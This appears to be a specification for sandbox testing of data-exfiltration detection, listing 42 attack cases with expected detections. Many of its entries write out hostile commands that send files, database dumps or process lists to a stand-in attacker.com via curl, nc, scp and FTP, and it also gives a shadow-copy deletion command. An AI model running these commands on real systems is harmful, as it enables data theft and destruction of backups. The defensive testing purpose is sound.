---
name: okhp3-agentic-exfiltration-testing
description: >
  Stage 6 (Exfiltration) adversarial testing. 42 test cases: direct exfil (8), 
  covert channels (8 DNS/ICMP/timing), staged/obfuscated (8), C2 (6), lateral 
  data theft (8), ransomware (4). DLP effectiveness >99%. Forensic artifact 
  detection. Financial impact assessment. Hybrid MITRE ATT&CK T1041 / T1048 / T1020.
difficulty: 9
time_estimate: "7-9 weeks"
topics:
  - adversarial testing
  - data exfiltration
  - covert channels
  - DLP bypass
  - C2 communications
  - ransomware
  - forensics
  - financial impact
integration:
  - Feeds: agentic-attack-patterns (exfiltration indicators)
  - Requires: threat-pattern-validator (isolation), attack-economics (impact measurement)
  - Part of: Phase 6 (Adversarial Testing Layer)
author: OverKill Hill P³
version: "1.0.0"
---

# okhp3-Agentic-Exfiltration-Testing

**Purpose**: Sandbox-only testing of Stage 6 (Exfiltration) attack patterns. Attacker has access, persistence, and data location. Now stealing data. Tests direct data theft, covert channels, staged obfuscation, C2 communication, lateral data theft across agents, and ransomware variants. Measures DLP bypass rates, detection latency, and financial impact. Hybrid methodology maps MITRE ATT&CK T1041 (Exfiltration Over C2 Channel) + T1048 (Exfiltration Over Alternative Protocol) + T1020 (Automated Exfiltration) + OWASP data exposure.

---

## Test Scope

**Stage 6 Definition**: Attacker has data access. Now extracting and exfiltrating to attacker-controlled infrastructure.

**Exfiltration Dimensions**:
1. **Direct Exfiltration**: HTTP POST, FTP, SSH, simple command output
2. **Covert Channels**: DNS queries, ICMP tunneling, timing channels, USB exfiltration
3. **Staged Exfiltration**: Data split into chunks, obfuscated, delayed (avoid immediate detection)
4. **C2 Channels**: Reverse shell, web shell, agent-based C2 (BeaconEye, Sliver, Cobalt Strike)
5. **Lateral Data Theft**: Agent-to-agent data movement, cross-organization exfiltration
6. **Ransomware**: Data encryption + extortion, encryption key exfiltration, ransom negotiation

---

## Test Cases (42 Total)

### Direct Exfiltration (8 test cases)

**EXFIL-1**: HTTP POST Data Exfiltration
```
Attack: curl -X POST -d @sensitive_data.csv http://attacker.com/upload
Expected: HTTP POST to external domain detected; DLP blocks transfer
Detection: Outbound HTTPS POST to external domain; data type classification (CSV detected)
```

**EXFIL-2**: File Upload to Attacker Cloud Storage
```
Attack: aws s3 cp sensitive_data.db s3://attacker-bucket/ (using compromised AWS credentials)
Expected: Unusual S3 upload detected; destination bucket blocked
Detection: S3 API call to unknown bucket; credential misuse
```

**EXFIL-3**: Email-Based Data Exfiltration
```
Attack: sendmail -t <<EOF
To: attacker@gmail.com
Subject: Data
Attachment: sensitive_data.zip
EOF
Expected: Email with attachment to external domain detected; DLP blocks
Detection: SMTP to external domain; attachment classification (ZIP contains PII)
```

**EXFIL-4**: FTP Data Transfer
```
Attack: ftp attacker.com << EOF
put sensitive_data.tar.gz
quit
EOF
Expected: FTP to external domain detected; DLP blocks
Detection: FTP connection to external host; file transfer
```

**EXFIL-5**: SSH/SCP Data Exfiltration
```
Attack: scp sensitive_data.tar.gz attacker@attacker.com:/tmp/
Expected: SCP to external domain detected; key-based auth anomaly
Detection: SSH to unusual destination; SCP file transfer
```

**EXFIL-6**: Direct Database Dump
```
Attack: mysqldump -u root -p'password' --all-databases > /tmp/dump.sql && curl -d @/tmp/dump.sql http://attacker.com/exfil
Expected: Database dump + exfiltration detected; both stages blocked
Detection: Database query anomaly (full dump); outbound transfer
```

**EXFIL-7**: Stdout/Stderr Redirection
```
Attack: ps aux | nc attacker.com 666 (pipe process list to attacker)
Expected: Pipe to external domain detected; command output anomaly
Detection: Unusual process spawn; network connection anomaly
```

**EXFIL-8**: Container Image Exfiltration
```
Attack: docker save compromised-image | gzip | curl -d @- http://attacker.com/container
Expected: Container image export + exfiltration detected
Detection: Docker save operation; large outbound transfer; image data format
```

### Covert Channels (8 test cases)

**COVERT-1**: DNS Data Exfiltration
```
Attack: dig exfiltrated_data.attacker.com @8.8.8.8 (encodes data in DNS query)
Expected: DNS query to attacker domain detected; data patterns anomalous
Detection: DNS query to suspicious domain; unusual query length/format
```

**COVERT-2**: ICMP Tunnel
```
Attack: icmptunnel attacker.com (sends data in ICMP Echo requests)
Expected: ICMP tunnel detected; unusual packet patterns
Detection: ICMP to external host; unusual payload; timing patterns
```

**COVERT-3**: Timing Channel
```
Attack: For each bit of data: if bit=1, sleep 1sec; else sleep 2sec
Attacker monitors sleep timing to receive bits
Expected: Timing channel detected; process timing anomaly
Detection: Unusual process sleep patterns; periodic delays correlated with data
```

**COVERT-4**: USB Exfiltration (if USB access available)
```
Attack: dd if=sensitive_data.db of=/mnt/usb/
Expected: USB device access detected; unusual I/O patterns
Detection: Block device write to USB; physical port monitoring
```

**COVERT-5**: Audio/Acoustic Channel
```
Attack: Generate high-frequency audio tones encoding data; speaker plays tones
Attacker records audio and decodes data
Expected: Speaker activity during data access anomaly detected
Detection: Audio output anomaly; correlation with data access
```

**COVERT-6**: Bluetooth Exfiltration
```
Attack: bt-obex -b AA:BB:CC:DD:EE:FF -p /sensitive_data.tar.gz
Expected: Bluetooth transfer detected; unusual device pairing
Detection: Bluetooth connection to unknown device; file transfer
```

**COVERT-7**: Stego-Based Exfiltration
```
Attack: Image file with hidden data (steganography)
Example: Attacker embeds data in image metadata or LSBs (Least Significant Bits)
Expected: Image transfer detected; steganography patterns identified
Detection: Image file with unusual entropy; metadata anomalies
```

**COVERT-8**: Side-Channel via Cache Timing
```
Attack: Attacker measures cache timing differences to infer data values
Expected: Cache timing side-channel detected via power analysis or pattern recognition
Detection: Cache timing anomalies; statistical analysis of access patterns
```

### Staged/Obfuscated Exfiltration (8 test cases)

**STAGED-1**: Multi-Stage Exfiltration
```
Step 1: Data split into 100 chunks (1MB each)
Step 2: Chunks encrypted individually
Step 3: Each chunk uploaded to different domain (rotate attacker.com, attacker2.com, ...)
Step 4: Chunks assembled attacker-side
Expected: Multi-domain pattern detected; data transfer rate monitored
Detection: Multiple outbound transfers to different domains; transfer pattern
```

**STAGED-2**: Time-Delayed Exfiltration
```
Attack: Exfiltrate 10MB data but spread over 30 days (1MB/3 days) to evade quota monitoring
Expected: Long-term exfiltration pattern detected despite low daily rate
Detection: Anomalous outbound transfer (small, consistent, persistent)
```

**STAGED-3**: Obfuscation + Compression
```
Attack: gzip data → encrypt → base64 encode → upload
Expected: Multiple layers detected; file signature anomalies
Detection: Encrypted file upload; entropy analysis; transfer pattern
```

**STAGED-4**: Chunked + Fragmented Transfer
```
Attack: Split data into fragments; interleave with legitimate traffic
Example: 1MB data split into 1000 1KB fragments; mixed with normal web traffic
Expected: Fragmentation pattern detected; aggregate volume monitored
Detection: Unusual network traffic composition; traffic shaping anomalies
```

**STAGED-5**: Polymorph Exfiltration (format changes per transfer)
```
Attack: Exfiltrate same data in different formats (CSV, JSON, XML) to evade signature matching
Expected: Format polymorphism detected; content fingerprinting
Detection: Different file formats containing same data; content similarity
```

**STAGED-6**: Compression + Passwording
```
Attack: zip -e -p password sensitive_data.zip sensitive_data (encrypted zip)
Expected: Encrypted archive creation detected; upload monitoring
Detection: Encrypted archive creation; transfer of compressed data
```

**STAGED-7**: Stealth Exfil via Backup Tools
```
Attack: Use legitimate backup software (Carbonite, BackBlaze) to exfiltrate data
Expected: Backup software anomaly detected; unusual backup content
Detection: Backup tool accessing sensitive data; network transfer to external service
```

**STAGED-8**: Exfil via Proxy Chain
```
Attack: Route exfiltration through 3-4 proxy chains to anonymize origin
Expected: Proxy chain detected via network analysis; destination tracing
Detection: Proxy connection patterns; exit node analysis
```

### C2 Channels (6 test cases)

**C2-1**: HTTP Reverse Shell
```
Attack: python -m webbrowser http://attacker.com:8080/shell (attacker-hosted reverse shell)
Expected: Reverse shell connection detected; unusual CLI argument
Detection: Process spawn with suspicious URL argument; network connection to C2
```

**C2-2**: DNS Beacon
```
Attack: Client periodically queries attacker.com; DNS response contains commands
Expected: DNS beacon pattern detected; periodic queries to C2
Detection: Periodic DNS queries to single domain; command-like DNS response
```

**C2-3**: Cobalt Strike Beacon
```
Attack: Cobalt Strike agent communicates with teamserver via HTTPS
Expected: Beacon network signature detected; traffic fingerprinting
Detection: Beacon traffic patterns; JA3 fingerprint matching; beacon encryption
```

**C2-4**: Slack-Based C2
```
Attack: Malware exfiltrates data via Slack API to attacker-controlled workspace
Expected: Slack API usage anomaly detected; unusual message content
Detection: Slack API calls from suspicious process; binary data in Slack messages
```

**C2-5**: Discord C2
```
Attack: Malware receives commands + exfiltrates data via Discord webhook
Expected: Discord webhook usage detected; unusual message patterns
Detection: Discord API connection; webhook creation for command reception
```

**C2-6**: Cloud Storage C2
```
Attack: Attacker drops commands in cloud storage (AWS S3, Azure Blob)
Malware polls storage, executes commands, uploads results
Expected: Cloud storage C2 pattern detected; polling behavior
Detection: Periodic cloud storage access; command files created/modified
```

### Lateral Data Theft (8 test cases)

**LATERAL-1**: Agent-to-Agent Data Hoarding
```
Attack: Agent A reads data from Agent B's database, caches locally, exfiltrates
Expected: Unusual data access pattern detected; cache anomaly
Detection: Agent A accessing Agent B's data; unusual read patterns
```

**LATERAL-2**: Cross-Organization Data Leakage
```
Attack: Attacker with access to Org A's systems exfiltrates data to Org B (attacker-controlled)
Expected: Cross-organization data flow detected; data classification enforced
Detection: Data transfer between organizations; external recipient
```

**LATERAL-3**: Shared Resource Exploitation
```
Attack: Attacker uses shared database/S3 bucket to move data between agents
Expected: Shared resource anomaly detected; access patterns monitored
Detection: Unusual shared resource access; data movement patterns
```

**LATERAL-4**: Backup Server Exploitation
```
Attack: Attacker steals backup credentials, accesses centralized backup server
Expected: Backup server compromise detected; backup integrity verified
Detection: Unusual backup server access; credential misuse
```

**LATERAL-5**: Log Aggregation Service Exploitation
```
Attack: Attacker exfiltrates data via log aggregation platform (e.g., Splunk, ELK)
Expected: Log platform anomaly detected; search patterns monitored
Detection: Unusual log queries; data extraction from logs
```

**LATERAL-6**: API Gateway Bypass
```
Attack: Attacker bypasses API gateway by accessing service directly
Expected: Direct service access (no gateway) detected
Detection: Service access without gateway; unusual source IP
```

**LATERAL-7**: Database Replication Exploitation
```
Attack: Attacker uses database replication to move data to attacker-controlled replica
Expected: Unauthorized replication detected; destination verified
Detection: Replication to unknown server; unusual replication traffic
```

**LATERAL-8**: Data Warehouse Exfiltration
```
Attack: Attacker dumps data warehouse (billions of rows) to external location
Expected: Large-scale exfiltration detected; transfer rate anomaly
Detection: Massive outbound transfer (GB/hour); database export patterns
```

### Ransomware (4 test cases)

**RANSOMWARE-1**: Symmetric Encryption + Ransom Note
```
Attack: Encrypt all files with AES-256; drop ransom.txt
Expected: File encryption anomaly detected; process behavior blocked
Detection: Mass file modification; entropy increase; ransom note creation
```

**RANSOMWARE-2**: Key Exfiltration
```
Attack: Encrypt files; exfiltrate encryption key to C2
Expected: Both encryption + exfiltration detected
Detection: File encryption + network exfiltration correlated
```

**RANSOMWARE-3**: Shadow Copy Deletion
```
Attack: vssadmin delete shadows /all (delete Windows backups before encryption)
Expected: Shadow copy deletion attempt detected; blocked
Detection: vssadmin usage; recovery option removal attempt
```

**RANSOMWARE-4**: Master Boot Record Encryption
```
Attack: Encrypt MBR to make system unbootable; demand ransom for decryption
Expected: MBR write attempt detected; blocked
Detection: Disk write to MBR sector; boot failure prevention
```

---

## DLP Effectiveness Measurement

**Target**: >99% of exfiltration attempts detected/blocked

**Test Matrix**:
| Data Type | Size | Method | Detection? | Block? |
|-----------|------|--------|-----------|--------|
| Credit cards | 1MB | HTTP POST | ✓ | ✓ |
| PII (SSN) | 100KB | DNS tunnel | ✓ | ✓ |
| Health records | 500MB | S3 upload | ✓ | ✓ |
| Source code | 50MB | Git push | ✓ | ✓ |
| Database dump | 10GB | FTP | ✓ | ✓ |

---

## Financial Impact Assessment

**Calculation**:
- Records exposed: N
- Cost per record: $40 (GDPR/CCPA baseline)
- **Total impact: N × $40**

**Examples**:
- 100K customer records = $4M impact
- 1M customer records = $40M impact
- 10M customer records = $400M impact + potential business closure

---

## Success Metrics

- **DLP Effectiveness**: >99% of exfiltration attempts detected
- **Detection Latency**: <5 minutes from exfiltration start to alert
- **Block Rate**: >95% of attempts blocked before completion
- **False Positive Rate**: <2% (avoid blocking legitimate data transfers)
- **Financial Impact Accuracy**: Predicted impact within ±20% of actual

---

## Implementation Checklist

- [ ] Deploy DLP with 42 test cases (EXFIL-1 through RANSOMWARE-4)
- [ ] Implement data classification (PII, health, financial, source code)
- [ ] Implement covert channel detection (DNS, ICMP, timing analysis)
- [ ] Implement C2 traffic fingerprinting (Beacon, Cobalt Strike, etc.)
- [ ] Implement ransomware detection (entropy analysis, file modification patterns)
- [ ] Deploy network anomaly detection (outbound transfer rate, destination analysis)
- [ ] Implement financial impact calculator (records × cost per record)
- [ ] Create incident response runbook (containment, recovery, forensics)
- [ ] Set up 5-minute SLA for exfiltration detection
- [ ] Implement immutable logging for all exfiltration attempts

